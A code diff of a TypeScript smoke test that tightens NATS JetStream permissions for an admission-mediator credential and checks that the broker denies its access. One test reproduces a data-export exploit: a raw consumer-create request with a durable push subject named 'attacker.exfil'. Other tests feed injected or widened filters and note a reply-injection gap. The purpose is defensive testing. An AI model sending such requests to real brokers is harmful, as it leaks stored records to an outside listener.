@@ -11,9 +11,10 @@
  * B1 structural half wired end-to-end.
  *
  * Both profiles run under their CONNECTION-SCOPED reply inbox (`_INBOX_<connId>.>` from the
- * builders + a matching client inboxPrefix, never the account-wide `_INBOX.>`), and the
- * mediator's enumeration consumer runs under its grant-pinned deterministic name — the two
- * cross-principal reaches the panel's aed1242 round required closed.
+ * builders + a matching client inboxPrefix, never the account-wide `_INBOX.>`). The mediator holds
+ * NO records-stream CONSUMER.CREATE (site 3, nats-server#8274): its drain enumerates through the
+ * SEALED records scanner, and this smoke proves the durable+PUSH exploit is DENIED to the mediator
+ * credential and leaves no surviving exporter.
  *
  * Broker killed by exact PID; never pkill nats-server.
  */
@@ -26,7 +27,7 @@ import { AckPolicy, DeliverPolicy, jetstream, jetstreamManager } from "@nats-io/
 import { Kvm } from "@nats-io/kv";
 import {
   isReachable, createEndpointStreams, contractDigest,
-  admissionMediatorGrants, retirementCleanerGrants, mediatorEnumConsumerName, recordsBucket, recordsKvStreamName,
+  admissionMediatorGrants, retirementCleanerGrants, recordsBucket, recordsKvStreamName,
   epfSubject, epfStreamName, epwSubject, epwStreamName, poolConsumerConfig, poolDurable,
   publishFactCreateOnly, readLastFact, parseDecisionFact, parseWorkTerminalFact, workTerminalSubject,
   reconcileWorkItem, workPoolContext,
@@ -35,6 +36,7 @@ import {
   openAdmissionMediator, mediatedRequestFromSubject, obtainEpfObligation, settleEpfOrSelfObligation,
 } from "../src/index.js";
 import { enumerateObligationRows } from "../src/admission-mediator.js";
+import { makeRecordsScannerOverConnection } from "../src/records-scanner.js";
 import { openLifecycleRegistry, activateLifecycle } from "../src/lifecycle-registry.js";
 import { runExactPoolCleaner } from "../src/retirement-barrier.js";
 
@@ -73,11 +75,11 @@ const enc = new TextEncoder();
 
 const PORT = 20000 + Math.floor(Math.random() * 40000);
 const sd = mkdtempSync(join(tmpdir(), "cotal-confine-"));
-// The connection-scoped inbox nonces (SPEC 13.9: never the account-wide `_INBOX.>` default) and
-// the mediator's grant-pinned deterministic enumeration consumer name they bind.
+// The connection-scoped inbox nonces (SPEC 13.9: never the account-wide `_INBOX.>` default). The
+// mediator holds NO records-stream consumer grant (site 3): its drain enumerates through the sealed
+// records scanner, so there is no per-mediator enumeration consumer name to bind.
 const MED_CONN = "med-conn-00000001";
 const CLN_CONN = "cln-conn-00000001";
-const ENUM_NAME = mediatorEnumConsumerName(EP, MED_CONN);
 const medRows = admissionMediatorGrants(SPACE, EP, MED_CONN);
 const clnRows = retirementCleanerGrants(SPACE, EP, [POOL], CLN_CONN);
 writeFileSync(join(sd, "server.conf"), [
@@ -115,7 +117,10 @@ try {
   // The connection carries the SCOPED inbox: the builder's `_INBOX_<connId>.>` subscribe row is
   // the ONLY inbox this credential holds, so every JS API request/reply below proves it live.
   medNc = await connect({ servers: `nats://127.0.0.1:${PORT}`, user: "med", pass: "pw", inboxPrefix: `_INBOX_${MED_CONN}` });
-  const med = await openAdmissionMediator(medNc, SPACE, EP, { now: () => NOW, enumConsumerName: ENUM_NAME });
+  // The mediator's drain enumerates through the SEALED records scanner over the TRUSTED connection
+  // (site 3): the mediator's own scoped credential holds no records-stream CONSUMER.CREATE.
+  const recScanner = makeRecordsScannerOverConnection(nc, SPACE);
+  const med = await openAdmissionMediator(medNc, SPACE, EP, { now: () => NOW, recordsScanner: recScanner });
   c("the scoped mediator credential binds + shape-proves the records store over its scoped inbox (STREAM.INFO row live)", true);
   const jsMed = jetstream(medNc, { timeout: 1500 });
   const jsmMed = await jetstreamManager(medNc, { timeout: 1500 });
@@ -140,17 +145,15 @@ try {
     const fact = parseDecisionFact(await readLastFact(jsm, epfStreamName(SPACE), decSubject), decSubject);
     c("…and the emitted fact is core-valid on the wire", fact.decision === "rejected");
   }
-  // The grant-pinned deterministic enumeration name is LIVE-sufficient: the endpoint-wide
-  // policy filter first, then the narrower per-target filter (the §13.1 barrier's shape) under
-  // the SAME name — the second create only works because the own-name DELETE row let the first
-  // run clean up, so the fixed name is reusable across filters.
+  // The mediator's drain enumerates through the SEALED records scanner (site 3), NOT its own
+  // credential — it holds no records-stream CONSUMER.CREATE. The scanner's lock serializes scans;
+  // the endpoint-wide filter and the narrower per-target filter both resolve to the same row.
   {
-    const handles = { jsm: jsmMed, js: jsMed };
-    const rows1 = await enumerateObligationRows(handles, SPACE, `oblig.*.${EP}.>`, { consumerName: ENUM_NAME });
-    c("the scoped credential ENUMERATES its oblig subtree under the grant-pinned deterministic name (CREATE/INFO/NEXT rows live)",
+    const rows1 = await enumerateObligationRows(recScanner, `oblig.*.${EP}.>`);
+    c("the mediator's drain enumerates its oblig subtree through the sealed records scanner (no scoped CREATE)",
       rows1.length === 1 && rows1[0].row.state === "rejected", rows1.map((r) => r.key));
-    const rows2 = await enumerateObligationRows(handles, SPACE, `oblig.${tgt.lifecycleUid}.${EP}.>`, { consumerName: ENUM_NAME });
-    c("…and the SAME pinned name is reusable under a narrower filter (the own-name DELETE row is live; no wedge)",
+    const rows2 = await enumerateObligationRows(recScanner, `oblig.${tgt.lifecycleUid}.${EP}.>`);
+    c("…and a narrower filter through the same sealed scanner returns the same row",
       rows2.length === 1 && rows2[0].key === rows1[0].key, rows2.map((r) => r.key));
   }
 
@@ -163,14 +166,23 @@ try {
     () => jsMed.publish(`$KV.${recordsBucket(SPACE)}.govern.${EP}`, enc.encode("{}")));
   await denied("the mediator CANNOT touch the AUTH store (cred/gate families)",
     () => jsMed.publish(`$KV.cotal_auth_${SPACE}.gate.${"z".repeat(26)}`, enc.encode("{}")));
-  await denied("the mediator CANNOT create its enumeration consumer with a FOREIGN filter (the create row pins the oblig subtree)",
-    () => jsmMed.consumers.add(recordsKvStreamName(SPACE), { name: ENUM_NAME, filter_subject: `$KV.${recordsBucket(SPACE)}.>`, ack_policy: AckPolicy.None, deliver_policy: DeliverPolicy.LastPerSubject, mem_storage: true, inactive_threshold: 30_000_000_000 }));
-  await denied("the mediator CANNOT create an enumeration consumer under a FOREIGN NAME even with the pinned filter (the create row pins the name too)",
-    () => jsmMed.consumers.add(recordsKvStreamName(SPACE), { name: "evilscan", filter_subject: `$KV.${recordsBucket(SPACE)}.oblig.*.${EP}.>`, ack_policy: AckPolicy.None, deliver_policy: DeliverPolicy.LastPerSubject, mem_storage: true, inactive_threshold: 30_000_000_000 }));
-  // A foreign records-stream consumer, created by the trusted side: the mediator's consumer
-  // rows are name-LITERAL, so it can neither read nor disturb it (the closed third residual).
+  // SITE 3 (nats-server#8274): the mediator holds NO records-stream CONSUMER.CREATE. A create-
+  // request BODY is not subject-ACL confinable, so ANY create grant would admit a `durable_name` +
+  // PUSH `deliver_subject` body — a persistent exporter of the whole oblig subtree that SURVIVES
+  // this credential's connection and revoke (reproduced live against the prior grant). The seal
+  // removed the grant entirely; enumeration moved to the sealed records scanner.
+  const exploitName = `medenum_${EP}-${MED_CONN}`; // the exact name the OLD grant pinned
+  const exploitFilter = `$KV.${recordsBucket(SPACE)}.oblig.*.${EP}.>`;
+  await denied("the mediator CANNOT create ANY records consumer (no CONSUMER.CREATE grant), even under the old pinned name+filter",
+    () => jsmMed.consumers.add(recordsKvStreamName(SPACE), { name: exploitName, filter_subject: exploitFilter, ack_policy: AckPolicy.None, deliver_policy: DeliverPolicy.LastPerSubject, mem_storage: true, inactive_threshold: 30_000_000_000 }));
+  await denied("DENIED: the EXACT EXPLOIT — a matching name+filter create with a DURABLE + PUSH body (a persistent oblig-subtree exporter)",
+    () => medNc.request(`$JS.API.CONSUMER.CREATE.${recordsKvStreamName(SPACE)}.${exploitName}.${exploitFilter}`, enc.encode(JSON.stringify({ stream_name: recordsKvStreamName(SPACE), config: { name: exploitName, durable_name: exploitName, filter_subject: exploitFilter, deliver_subject: `attacker.exfil.${SPACE}`, deliver_policy: "all", ack_policy: "none" } })), { timeout: 1500 }));
+  await denied("no exploit consumer survives on the records stream (denied at publish, nothing created)",
+    () => jsm.consumers.info(recordsKvStreamName(SPACE), exploitName));
+  // A foreign records-stream consumer, created by the trusted side: the mediator holds NO records
+  // consumer rows at all (site 3), so it can neither read nor disturb it.
   await jsm.consumers.add(recordsKvStreamName(SPACE), { name: "victimscan", filter_subject: `$KV.${recordsBucket(SPACE)}.oblig.*.${EP}.>`, ack_policy: AckPolicy.None, deliver_policy: DeliverPolicy.LastPerSubject, mem_storage: true, inactive_threshold: 30_000_000_000 });
-  await denied("the mediator CANNOT read a FOREIGN-NAMED records consumer (INFO is pinned to its own deterministic name)",
+  await denied("the mediator CANNOT read any records consumer (no CONSUMER.INFO grant)",
     () => jsmMed.consumers.info(recordsKvStreamName(SPACE), "victimscan"));
   // The pull probe needs an EXPLICIT reply subscription: an allowed raw NEXT always answers on
   // the reply subject (a 408 status when nothing is deliverable), while nats.js request() maps
@@ -186,9 +198,9 @@ try {
     await wait(800);
     try { rsub.unsubscribe(); } catch { /* already closed */ }
     await pump;
-    c("the mediator CANNOT pull from a FOREIGN-NAMED records consumer (MSG.NEXT is pinned; no cross-endpoint delivery disturbance)", !gotReply, "the broker ALLOWED the pull (a reply arrived)");
+    c("the mediator CANNOT pull from any records consumer (no CONSUMER.MSG.NEXT grant; no cross-endpoint delivery disturbance)", !gotReply, "the broker ALLOWED the pull (a reply arrived)");
   }
-  await denied("the mediator CANNOT delete a FOREIGN-NAMED records consumer (DELETE is pinned to its own name)",
+  await denied("the mediator CANNOT delete any records consumer (no CONSUMER.DELETE grant)",
     () => jsmMed.consumers.delete(recordsKvStreamName(SPACE), "victimscan"));
   await subDenied("the mediator CANNOT subscribe the account-wide _INBOX.> (its reply inbox is connection-scoped)", "med", "_INBOX.>", PORT);
   await subDenied("the mediator CANNOT subscribe ANOTHER principal's scoped inbox", "med", `_INBOX_${CLN_CONN}.>`, PORT);
@@ -231,6 +243,26 @@ try {
     try { fsub.unsubscribe(); } catch { /* max reached */ }
     c("raw JetStream API authority CAN direct a response onto a foreign reply subject: the named confused-deputy injection residual", injected);
   }
+
+  console.log("E. the sealed records scanner is brand + space-bonded, and its filter is oblig-confined");
+  // Brand negatives (site-1 HIGH-1, mirrored to the records scanner): the ONLY RecordsScanner an
+  // injection point accepts is one built by openRecordsScanner/makeRecordsScannerOverConnection,
+  // bonded to THIS space. A hand-assembled structural object (its scanObligations returns []) or a
+  // foreign-space scanner would let a mediator drain declare quiescence over live obligations.
+  await denied("openAdmissionMediator REJECTS a hand-assembled records scanner (not built by the module; never enumerates)",
+    () => openAdmissionMediator(medNc, SPACE, EP, { now: () => NOW, recordsScanner: { scanObligations: async () => [], close: async () => {} } as never }));
+  await denied("openAdmissionMediator REJECTS a FOREIGN-SPACE records scanner (bonded to another space)",
+    () => openAdmissionMediator(medNc, SPACE, EP, { now: () => NOW, recordsScanner: makeRecordsScannerOverConnection(nc, "otherspace") }));
+  await denied("openLifecycleRegistry REJECTS a foreign-space records scanner",
+    () => openLifecycleRegistry(nc, SPACE, undefined, makeRecordsScannerOverConnection(nc, "otherspace")));
+  // Filter confinement: the closed scan op refuses any filter that escapes the `oblig.` subtree, so
+  // the sealed scanner can never be widened to the records root or a foreign subtree (head/govern/lease).
+  await denied("scanObligations REFUSES a non-oblig subtree filter (govern head)",
+    () => recScanner.scanObligations(`govern.${EP}.>`));
+  await denied("scanObligations REFUSES a records-root widen",
+    () => recScanner.scanObligations(">"));
+  await denied("scanObligations REFUSES a dotted-injection filter segment",
+    () => recScanner.scanObligations("oblig.bad seg.>"));
 
   console.log("C. the cleaner's rows are LIVE-SUFFICIENT (the real cleaner over the scoped credential)");
   // One expired item in the listed pool, enqueued + accepted by the trusted side.
